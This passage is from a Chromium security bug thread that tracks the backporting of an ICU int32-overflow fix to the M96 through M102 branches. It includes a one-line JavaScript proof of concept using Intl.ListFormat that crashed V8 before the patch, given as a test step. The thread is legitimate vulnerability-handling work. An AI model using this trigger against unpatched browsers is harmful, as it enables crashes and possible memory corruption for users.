4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?

NO

5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Run the following line of javascript:
new Intl.ListFormat().format(Array(16).fill("a".repeat(0xFFFFFFE))).length

Expect: v8 processor not crash
Actual before the fix- v8 processor crashed



### am...@chromium.org (2022-05-05)

M102 merge approved, please merge this fix to branch 5005 at your earliest convenience. 

### am...@chromium.org (2022-05-06)

Thank you for fixing this issue so quickly, Frank. M101 and M100 merges approved. Please merge this fix to the relevant release branches (https://chromiumdash.appspot.com/branches) by 11am PST today 
(apologies for the late notice, I was under the impression that the next releases were being cut on Monday for a Tuesday release, but they are instead being cut today for release Monday and the schedules have not been updated)  

### pw...@korea.ac.kr (2022-05-06)

Thank you for your efforts to expedite!

### ft...@chromium.org (2022-05-06)

CLs for ICU branches for m100/m101/m102 created. Need LGTM to land first. Then I will need to create DEPS changes
https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3632709
https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3632711
https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3632714

### ft...@chromium.org (2022-05-06)

Process record of how I cp https://docs.google.com/document/d/11QqOopKdhVipuLmq_gMBixU3CS52w60dHs60Ji5YRs4/edit?usp=sharing

### gi...@appspot.gserviceaccount.com (2022-05-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/deps/icu/+/14e51893e5b59140c9878ec2f53045a4fcdbe6e6

commit 14e51893e5b59140c9878ec2f53045a4fcdbe6e6
Author: Frank Tang <ftang@chromium.org>
Date: Fri Apr 29 23:50:59 2022

[m100] CP PR 2070 fix int32 overflow

https://github.com/unicode-org/icu/pull/2070
https://unicode-org.atlassian.net/browse/ICU-22005

Bug: chromium:1316946
Change-Id: I6cd7d687a55b6cc157b1afa52365908be2992fa6
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3614280
Reviewed-by: Jungshik Shin <jshin@chromium.org>
(cherry picked from commit 85814e1af52482199a13d284545623ffbc9eef83)
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3632709

[modify] https://crrev.com/14e51893e5b59140c9878ec2f53045a4fcdbe6e6/source/test/intltest/formatted_string_builder_test.cpp
[add] https://crrev.com/14e51893e5b59140c9878ec2f53045a4fcdbe6e6/patches/formatted_string_builder.patch
[modify] https://crrev.com/14e51893e5b59140c9878ec2f53045a4fcdbe6e6/source/i18n/formatted_string_builder.cpp
[modify] https://crrev.com/14e51893e5b59140c9878ec2f53045a4fcdbe6e6/README.chromium


### gi...@appspot.gserviceaccount.com (2022-05-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/deps/icu/+/aa9a86d51085d896313e026c18d7212b64378144

commit aa9a86d51085d896313e026c18d7212b64378144
Author: Frank Tang <ftang@chromium.org>
Date: Fri Apr 29 23:50:59 2022

[m101] CP PR 2070 fix int32 overflow

https://github.com/unicode-org/icu/pull/2070
https://unicode-org.atlassian.net/browse/ICU-22005

Bug: chromium:1316946
Change-Id: I6cd7d687a55b6cc157b1afa52365908be2992fa6
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3614280
Reviewed-by: Jungshik Shin <jshin@chromium.org>
(cherry picked from commit 85814e1af52482199a13d284545623ffbc9eef83)
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3632711

[modify] https://crrev.com/aa9a86d51085d896313e026c18d7212b64378144/source/test/intltest/formatted_string_builder_test.cpp
[add] https://crrev.com/aa9a86d51085d896313e026c18d7212b64378144/patches/formatted_string_builder.patch
[modify] https://crrev.com/aa9a86d51085d896313e026c18d7212b64378144/source/i18n/formatted_string_builder.cpp
[modify] https://crrev.com/aa9a86d51085d896313e026c18d7212b64378144/README.chromium


### gi...@appspot.gserviceaccount.com (2022-05-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/deps/icu/+/e1f2f4f42368555835a7a0894188716556c32871

commit e1f2f4f42368555835a7a0894188716556c32871
Author: Frank Tang <ftang@chromium.org>
Date: Fri Apr 29 23:50:59 2022

[m102] CP PR 2070 fix int32 overflow

https://github.com/unicode-org/icu/pull/2070
https://unicode-org.atlassian.net/browse/ICU-22005

Bug: chromium:1316946
Change-Id: I6cd7d687a55b6cc157b1afa52365908be2992fa6
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3614280
Reviewed-by: Jungshik Shin <jshin@chromium.org>
(cherry picked from commit 85814e1af52482199a13d284545623ffbc9eef83)
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3632714

[modify] https://crrev.com/e1f2f4f42368555835a7a0894188716556c32871/source/test/intltest/formatted_string_builder_test.cpp
[add] https://crrev.com/e1f2f4f42368555835a7a0894188716556c32871/patches/formatted_string_builder.patch
[modify] https://crrev.com/e1f2f4f42368555835a7a0894188716556c32871/source/i18n/formatted_string_builder.cpp
[modify] https://crrev.com/e1f2f4f42368555835a7a0894188716556c32871/README.chromium


### gi...@appspot.gserviceaccount.com (2022-05-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/deps/icu/+/14e51893e5b59140c9878ec2f53045a4fcdbe6e6

commit 14e51893e5b59140c9878ec2f53045a4fcdbe6e6
Author: Frank Tang <ftang@chromium.org>
Date: Fri Apr 29 23:50:59 2022

[m100] CP PR 2070 fix int32 overflow

https://github.com/unicode-org/icu/pull/2070
https://unicode-org.atlassian.net/browse/ICU-22005

Bug: chromium:1316946
Change-Id: I6cd7d687a55b6cc157b1afa52365908be2992fa6
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3614280
Reviewed-by: Jungshik Shin <jshin@chromium.org>
(cherry picked from commit 85814e1af52482199a13d284545623ffbc9eef83)
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3632709

[modify] https://crrev.com/14e51893e5b59140c9878ec2f53045a4fcdbe6e6/source/test/intltest/formatted_string_builder_test.cpp
[add] https://crrev.com/14e51893e5b59140c9878ec2f53045a4fcdbe6e6/patches/formatted_string_builder.patch
[modify] https://crrev.com/14e51893e5b59140c9878ec2f53045a4fcdbe6e6/source/i18n/formatted_string_builder.cpp
[modify] https://crrev.com/14e51893e5b59140c9878ec2f53045a4fcdbe6e6/README.chromium


### gi...@appspot.gserviceaccount.com (2022-05-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/deps/icu/+/aa9a86d51085d896313e026c18d7212b64378144

commit aa9a86d51085d896313e026c18d7212b64378144
Author: Frank Tang <ftang@chromium.org>
Date: Fri Apr 29 23:50:59 2022

[m101] CP PR 2070 fix int32 overflow

https://github.com/unicode-org/icu/pull/2070
https://unicode-org.atlassian.net/browse/ICU-22005

Bug: chromium:1316946
Change-Id: I6cd7d687a55b6cc157b1afa52365908be2992fa6
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3614280
Reviewed-by: Jungshik Shin <jshin@chromium.org>
(cherry picked from commit 85814e1af52482199a13d284545623ffbc9eef83)
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3632711

[modify] https://crrev.com/aa9a86d51085d896313e026c18d7212b64378144/source/test/intltest/formatted_string_builder_test.cpp
[add] https://crrev.com/aa9a86d51085d896313e026c18d7212b64378144/patches/formatted_string_builder.patch
[modify] https://crrev.com/aa9a86d51085d896313e026c18d7212b64378144/source/i18n/formatted_string_builder.cpp
[modify] https://crrev.com/aa9a86d51085d896313e026c18d7212b64378144/README.chromium


### gi...@appspot.gserviceaccount.com (2022-05-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/deps/icu/+/14e51893e5b59140c9878ec2f53045a4fcdbe6e6

commit 14e51893e5b59140c9878ec2f53045a4fcdbe6e6
Author: Frank Tang <ftang@chromium.org>
Date: Fri Apr 29 23:50:59 2022

[m100] CP PR 2070 fix int32 overflow

https://github.com/unicode-org/icu/pull/2070
https://unicode-org.atlassian.net/browse/ICU-22005

Bug: chromium:1316946
Change-Id: I6cd7d687a55b6cc157b1afa52365908be2992fa6
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3614280
Reviewed-by: Jungshik Shin <jshin@chromium.org>
(cherry picked from commit 85814e1af52482199a13d284545623ffbc9eef83)
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3632709

[modify] https://crrev.com/14e51893e5b59140c9878ec2f53045a4fcdbe6e6/source/test/intltest/formatted_string_builder_test.cpp
[add] https://crrev.com/14e51893e5b59140c9878ec2f53045a4fcdbe6e6/patches/formatted_string_builder.patch
[modify] https://crrev.com/14e51893e5b59140c9878ec2f53045a4fcdbe6e6/source/i18n/formatted_string_builder.cpp
[modify] https://crrev.com/14e51893e5b59140c9878ec2f53045a4fcdbe6e6/README.chromium


### [Deleted User] (2022-05-06)

LTS Milestone M96

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ft...@chromium.org (2022-05-06)

The 3 DPES rolling to pick up the fixes from that 3 branches are
[m100] https://chromium-review.googlesource.com/c/chromium/src/+/3630968
[m101] https://chromium-review.googlesource.com/c/chromium/src/+/3632597
[m102] https://chromium-review.googlesource.com/c/chromium/src/+/3630969

All 3 of them are waiting in the CQ to complete. I will watch the status. 

### ft...@chromium.org (2022-05-06)

[Empty comment from Monorail migration]

### ft...@chromium.org (2022-05-06)

remove the merge-merged-x label because that was added while we land the branching, not really complete the merge. After the DEPS changes merge it will be real.

### gi...@appspot.gserviceaccount.com (2022-05-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/0689fa8aa71ec6950d4c4eeb913c475e2794640c

commit 0689fa8aa71ec6950d4c4eeb913c475e2794640c
Author: Frank Tang <ftang@chromium.org>
Date: Fri May 06 20:17:41 2022

[m100] Roll ICU to CP 2070 to fix int32 overflow

https://chromium.googlesource.com/chromium/deps/icu.git/+log/e94822cd..14e51893

Bug: chromium:1316946
Change-Id: I11d038a3b6ab2fa6b92ee719615d863b9e15a02c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3630968
Commit-Queue: Frank Tang <ftang@chromium.org>
Reviewed-by: Jungshik Shin <jshin@chromium.org>
Cr-Commit-Position: refs/branch-heads/4896@{#1237}
Cr-Branched-From: 1f63ff4bc27570761b35ffbc7f938f6586f7bee8-refs/heads/main@{#972766}

[modify] https://crrev.com/0689fa8aa71ec6950d4c4eeb913c475e2794640c/DEPS


### gi...@appspot.gserviceaccount.com (2022-05-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/0f880cb979c3b789d15ceea31c68056f86fcb279

commit 0f880cb979c3b789d15ceea31c68056f86fcb279
Author: Frank Tang <ftang@chromium.org>
Date: Fri May 06 20:26:39 2022

[m102] Roll ICU to CP 2070 to fix int32 overflow

https://chromium.googlesource.com/chromium/deps/icu.git/+log/1fd0dbea..e1f2f4f

Bug: chromium:1316946
Change-Id: I2c6d64316c65b81306a1d0b87d9c1ba9537c5af7
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3630969
Reviewed-by: Jungshik Shin <jshin@chromium.org>
Commit-Queue: Frank Tang <ftang@chromium.org>
Cr-Commit-Position: refs/branch-heads/5005@{#501}
Cr-Branched-From: 5b4d9450fee01f821b6400e947b3839727643a71-refs/heads/main@{#992738}

[modify] https://crrev.com/0f880cb979c3b789d15ceea31c68056f86fcb279/DEPS


### gi...@appspot.gserviceaccount.com (2022-05-06)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/4d51399b74c279b84399dfb0bdae35e4e407f276

commit 4d51399b74c279b84399dfb0bdae35e4e407f276
Author: Frank Tang <ftang@chromium.org>
Date: Fri May 06 21:20:33 2022

[m101] Roll ICU to CP 2070 to fix int32 overflow

https://chromium.googlesource.com/chromium/deps/icu.git/+log/ea8c08d..aa9a86d

Bug: chromium:1316946
Change-Id: Ie372a671e5a8713b6dd45b388785a131b2613d31
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3632597
Reviewed-by: Jungshik Shin <jshin@chromium.org>
Commit-Queue: Frank Tang <ftang@chromium.org>
Cr-Commit-Position: refs/branch-heads/4951@{#1185}
Cr-Branched-From: 27de6227ca357da0d57ae2c7b18da170c4651438-refs/heads/main@{#982481}

[modify] https://crrev.com/4d51399b74c279b84399dfb0bdae35e4e407f276/DEPS


### rz...@google.com (2022-05-09)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-05-09)

[Empty comment from Monorail migration]

### am...@google.com (2022-05-09)

[Empty comment from Monorail migration]

### pw...@korea.ac.kr (2022-05-09)

Thanks!

## CREDIT Information
DoHyun Lee (@l33d0hyun) of DNSLab, Korea University

### rz...@google.com (2022-05-11)

[Empty comment from Monorail migration]

### vo...@google.com (2022-05-16)

[Empty comment from Monorail migration]

### am...@google.com (2022-05-16)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-05-16)

Congratulations, DoHyun! The VRP Panel has decided to award you $5,000 for this report. A member of our finance team will be in touch soon to arrange payment. Thank you for your efforts and taking the time to report this issue to us! 

### pw...@korea.ac.kr (2022-05-17)

Thank you!!

### vo...@google.com (2022-05-17)

1. https://crrev.com/c/3632709
2. Low - No conflicts (except for comments/whitespaces) in the code. Removed test changes removed since tests were added after M96.
3. Yes, M100
4. Yes

### [Deleted User] (2022-05-17)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### gm...@google.com (2022-05-17)

[Empty comment from Monorail migration]

### ft...@chromium.org (2022-05-17)

for M96 branch we are based on
https://chromium.googlesource.com/chromium/src/+/refs/tags/96.0.4664.208/DEPS#1176

    Var('chromium_git') + '/chromium/deps/icu.git' + '@' + 'eedbaf76e49d28465d9119b10c30b82906e606ff',



### ft...@chromium.org (2022-05-17)

git checkout -b m96 eedbaf76e49d28465d9119b10c30b82906e606ff
git push origin m96:refs/heads/chromium/m96

https://chromium.googlesource.com/chromium/deps/icu.git/+/refs/heads/chromium/m96 is created 

### gi...@appspot.gserviceaccount.com (2022-05-18)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/deps/icu/+/232f5a9b0abb9266c7fb9a0aa26c6d872f03706a

commit 232f5a9b0abb9266c7fb9a0aa26c6d872f03706a
Author: Frank Tang <ftang@chromium.org>
Date: Fri Apr 29 23:50:59 2022

[m96] CP PR 2070 fix int32 overflow

https://github.com/unicode-org/icu/pull/2070
https://unicode-org.atlassian.net/browse/ICU-22005

Bug: chromium:1316946
Change-Id: I6cd7d687a55b6cc157b1afa52365908be2992fa6
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3614280
Reviewed-by: Jungshik Shin <jshin@chromium.org>
(cherry picked from commit 85814e1af52482199a13d284545623ffbc9eef83)
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/deps/icu/+/3653237
Reviewed-by: Zakhar Voit <voit@google.com>
Reviewed-by: Jana Grill <janagrill@google.com>

[add] https://crrev.com/232f5a9b0abb9266c7fb9a0aa26c6d872f03706a/patches/formatted_string_builder.patch
[modify] https://crrev.com/232f5a9b0abb9266c7fb9a0aa26c6d872f03706a/source/i18n/formatted_string_builder.cpp
[modify] https://crrev.com/232f5a9b0abb9266c7fb9a0aa26c6d872f03706a/README.chromium


### vo...@google.com (2022-05-18)

We'll need https://crrev.com/c/3653876 in M96-LTS as well to roll icu dependency.

### gi...@appspot.gserviceaccount.com (2022-05-19)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/fed7af680c379168fee93f697aef34146c427385

commit fed7af680c379168fee93f697aef34146c427385
Author: Frank Tang <ftang@chromium.org>
Date: Thu May 19 08:55:19 2022

[M96-LTS] Roll ICU to CP 2070 to fix int32 overflow

https://chromium.googlesource.com/chromium/deps/icu.git/+log/eedbaf76..232f5a9b

(cherry picked from commit 0689fa8aa71ec6950d4c4eeb913c475e2794640c)

Bug: chromium:1316946
Change-Id: I11d038a3b6ab2fa6b92ee719615d863b9e15a02c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3630968
Commit-Queue: Frank Tang <ftang@chromium.org>
Cr-Original-Commit-Position: refs/branch-heads/4896@{#1237}
Cr-Original-Branched-From: 1f63ff4bc27570761b35ffbc7f938f6586f7bee8-refs/heads/main@{#972766}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3653876
Reviewed-by: Frank Tang <ftang@chromium.org>
Reviewed-by: Jana Grill <janagrill@google.com>
Commit-Queue: Zakhar Voit <voit@google.com>
Cr-Commit-Position: refs/branch-heads/4664@{#1635}
Cr-Branched-From: 24dc4ee75e01a29d390d43c9c264372a169273a7-refs/heads/main@{#929512}

[modify] https://crrev.com/fed7af680c379168fee93f697aef34146c427385/DEPS


### vo...@google.com (2022-05-19)

[Empty comment from Monorail migration]

### am...@google.com (2022-05-24)

[Empty comment from Monorail migration]

### pw...@korea.ac.kr (2022-07-15)

[Comment Deleted]

### pw...@korea.ac.kr (2022-07-15)

^ amyressler@google.com

ref to https://bugs.chromium.org/p/chromium/issues/detail?id=1316946#c91

### am...@chromium.org (2022-07-15)

Thanks, disclosure date for this issue would be 6 August, so temporarily setting RV-SE. Setting next action date of 30 August to re-evaluate. 

### pw...@korea.ac.kr (2022-07-15)

Thanks sir!

### pw...@korea.ac.kr (2022-07-21)

[Comment Deleted]

### am...@chromium.org (2022-07-21)

Excellent! Thank you so much for taking the time to update us - greatly appreciated! Removing RV-SE accordingly. 

### am...@google.com (2022-07-26)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-07-29)

[Empty comment from Monorail migration]

### [Deleted User] (2022-08-06)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1316946?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40059400)*
